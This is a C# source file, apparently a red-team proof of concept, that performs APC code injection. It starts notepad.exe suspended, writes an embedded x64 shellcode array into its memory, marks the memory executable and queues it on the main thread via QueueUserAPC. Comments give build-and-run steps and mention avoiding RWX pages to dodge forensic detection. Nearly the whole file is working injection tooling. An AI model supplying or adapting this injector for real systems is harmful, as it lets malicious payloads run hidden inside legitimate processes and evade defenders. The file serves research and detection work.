// Original code created by Casey Smith - https://gist.github.com/subTee/a8d86ee9b9792dac0f0f4b021f2763c1
//
// Modified and commented by @pwndizzle
//
// To run:
// 1. C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe apc-injection.cs && apc-injection.exe

using System;
using System.Reflection;
using System.Diagnostics;
using System.Runtime.InteropServices;


public class ApcInjectionNewProcess
{
	public static void Main()
	{	
		
		byte[] shellcode = new byte[279] {0xfc,0x48,0x81,0xe4,0xf0,
            0xff,0xff,0xff,0xe8,0xd0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,
            0x52,0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x3e,
            0x48,0x8b,0x52,0x18,0x3e,0x48,0x8b,0x52,0x20,0x3e,0x48,0x8b,
            0x72,0x50,0x3e,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,
            0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,
            0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x3e,0x48,0x8b,
            0x52,0x20,0x3e,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x3e,0x8b,0x80,
            0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x6f,0x48,0x01,0xd0,
            0x50,0x3e,0x8b,0x48,0x18,0x3e,0x44,0x8b,0x40,0x20,0x49,0x01,
            0xd0,0xe3,0x5c,0x48,0xff,0xc9,0x3e,0x41,0x8b,0x34,0x88,0x48,
            0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,
            0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x3e,0x4c,0x03,0x4c,
            0x24,0x08,0x45,0x39,0xd1,0x75,0xd6,0x58,0x3e,0x44,0x8b,0x40,
            0x24,0x49,0x01,0xd0,0x66,0x3e,0x41,0x8b,0x0c,0x48,0x3e,0x44,
            0x8b,0x40,0x1c,0x49,0x01,0xd0,0x3e,0x41,0x8b,0x04,0x88,0x48,
            0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,
            0x59,0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,
            0x41,0x59,0x5a,0x3e,0x48,0x8b,0x12,0xe9,0x49,0xff,0xff,0xff,
            0x5d,0x49,0xc7,0xc1,0x00,0x00,0x00,0x00,0x3e,0x48,0x8d,0x95,
            0xfe,0x00,0x00,0x00,0x3e,0x4c,0x8d,0x85,0x04,0x01,0x00,0x00,
            0x48,0x31,0xc9,0x41,0xba,0x45,0x83,0x56,0x07,0xff,0xd5,0x48,
            0x31,0xc9,0x41,0xba,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x68,0x65,
            0x6c,0x6c,0x6f,0x00,0x68,0x65,0x6c,0x6c,0x6f,0x00};
		
		// Target process to inject into
		string processpath = @"C:\Windows\notepad.exe";
		STARTUPINFO si = new STARTUPINFO();
		PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
		
		// Create new process in suspended state to inject into
		bool success = CreateProcess(processpath, null, 
			IntPtr.Zero, IntPtr.Zero, false, 
			ProcessCreationFlags.CREATE_SUSPENDED, 
			IntPtr.Zero, null, ref si, out pi);
		
		// Allocate memory within process and write shellcode
		IntPtr resultPtr = VirtualAllocEx(pi.hProcess, IntPtr.Zero, shellcode.Length,MEM_COMMIT, PAGE_READWRITE);
		IntPtr bytesWritten = IntPtr.Zero;
		bool resultBool = WriteProcessMemory(pi.hProcess,resultPtr,shellcode,shellcode.Length, out bytesWritten);
		
		// Open thread
		IntPtr sht = OpenThread(ThreadAccess.SET_CONTEXT, false, (int)pi.dwThreadId);
		uint oldProtect = 0;
		
		// Modify memory permissions on allocated shellcode
		resultBool = VirtualProtectEx(pi.hProcess,resultPtr, shellcode.Length,PAGE_EXECUTE_READ, out oldProtect);
		
		// Assign address of shellcode to the target thread apc queue
		IntPtr ptr = QueueUserAPC(resultPtr,sht,IntPtr.Zero);
		
		IntPtr ThreadHandle = pi.hThread;
		ResumeThread(ThreadHandle);
		
	}
	
	
	private static UInt32 MEM_COMMIT = 0x1000;
 
	private static UInt32 PAGE_EXECUTE_READWRITE = 0x40; //I'm not using this #DFIR  ;-)
	private static UInt32 PAGE_READWRITE = 0x04;
	private static UInt32 PAGE_EXECUTE_READ = 0x20;
	
	
	[Flags]
	public enum ProcessAccessFlags : uint
	{
		All = 0x001F0FFF,
		Terminate = 0x00000001,
		CreateThread = 0x00000002,
		VirtualMemoryOperation = 0x00000008,
		VirtualMemoryRead = 0x00000010,
		VirtualMemoryWrite = 0x00000020,
		DuplicateHandle = 0x00000040,
		CreateProcess = 0x000000080,
		SetQuota = 0x00000100,
		SetInformation = 0x00000200,
		QueryInformation = 0x00000400,
		QueryLimitedInformation = 0x00001000,
		Synchronize = 0x00100000
	}
	
	[Flags]
	public enum ProcessCreationFlags : uint
	{
		ZERO_FLAG = 0x00000000,
		CREATE_BREAKAWAY_FROM_JOB = 0x01000000,
		CREATE_DEFAULT_ERROR_MODE = 0x04000000,
		CREATE_NEW_CONSOLE = 0x00000010,
		CREATE_NEW_PROCESS_GROUP = 0x00000200,
		CREATE_NO_WINDOW = 0x08000000,
		CREATE_PROTECTED_PROCESS = 0x00040000,
		CREATE_PRESERVE_CODE_AUTHZ_LEVEL = 0x02000000,
		CREATE_SEPARATE_WOW_VDM = 0x00001000,
		CREATE_SHARED_WOW_VDM = 0x00001000,
		CREATE_SUSPENDED = 0x00000004,
		CREATE_UNICODE_ENVIRONMENT = 0x00000400,
		DEBUG_ONLY_THIS_PROCESS = 0x00000002,
		DEBUG_PROCESS = 0x00000001,
		DETACHED_PROCESS = 0x00000008,
		EXTENDED_STARTUPINFO_PRESENT = 0x00080000,
		INHERIT_PARENT_AFFINITY = 0x00010000
	}
	public struct PROCESS_INFORMATION
	{
		public IntPtr hProcess;
		public IntPtr hThread;
		public uint dwProcessId;
		public uint dwThreadId;
	}
	public struct STARTUPINFO
	{
		public uint cb;
		public string lpReserved;
		public string lpDesktop;
		public string lpTitle;
		public uint dwX;
		public uint dwY;
		public uint dwXSize;
		public uint dwYSize;
		public uint dwXCountChars;
		public uint dwYCountChars;
		public uint dwFillAttribute;
		public uint dwFlags;
		public short wShowWindow;
		public short cbReserved2;
		public IntPtr lpReserved2;
		public IntPtr hStdInput;
		public IntPtr hStdOutput;
		public IntPtr hStdError;
	}
	
	[Flags]
	public enum    ThreadAccess : int
	{
		TERMINATE           = (0x0001)  ,
		SUSPEND_RESUME      = (0x0002)  ,
		GET_CONTEXT         = (0x0008)  ,
		SET_CONTEXT         = (0x0010)  ,
		SET_INFORMATION     = (0x0020)  ,
		QUERY_INFORMATION       = (0x0040)  ,
		SET_THREAD_TOKEN    = (0x0080)  ,
		IMPERSONATE         = (0x0100)  ,
		DIRECT_IMPERSONATION    = (0x0200)
	}
	
	[DllImport("kernel32.dll", SetLastError = true)]
	public static extern IntPtr OpenThread(ThreadAccess dwDesiredAccess, bool bInheritHandle,
		int dwThreadId);
	
	[DllImport("kernel32.dll",SetLastError = true)]
	public static extern bool WriteProcessMemory(
		IntPtr hProcess,
		IntPtr lpBaseAddress,
		byte[] lpBuffer,
		int nSize,
		out IntPtr lpNumberOfBytesWritten);
	
	[DllImport("kernel32.dll")]
	public static extern IntPtr QueueUserAPC(IntPtr pfnAPC, IntPtr hThread, IntPtr dwData);
	
	[DllImport("kernel32")]
	public static extern IntPtr VirtualAlloc(UInt32 lpStartAddr,
		 Int32 size, UInt32 flAllocationType, UInt32 flProtect);
	[DllImport("kernel32.dll", SetLastError = true )]
	public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress,
	Int32 dwSize, UInt32 flAllocationType, UInt32 flProtect);
	
	[DllImport("kernel32.dll", SetLastError = true)]
	public static extern IntPtr OpenProcess(
	 ProcessAccessFlags processAccess,
	 bool bInheritHandle,
	 int processId
	);
	
	
	[DllImport("kernel32.dll")]
	public static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes,bool bInheritHandles, ProcessCreationFlags dwCreationFlags, IntPtr lpEnvironment,string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
	[DllImport("kernel32.dll")]
	public static extern uint ResumeThread(IntPtr hThread);
	[DllImport("kernel32.dll")]
	public static extern uint SuspendThread(IntPtr hThread);
	[DllImport("kernel32.dll")]
	public static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress,
	int dwSize, uint flNewProtect, out uint lpflOldProtect);
}
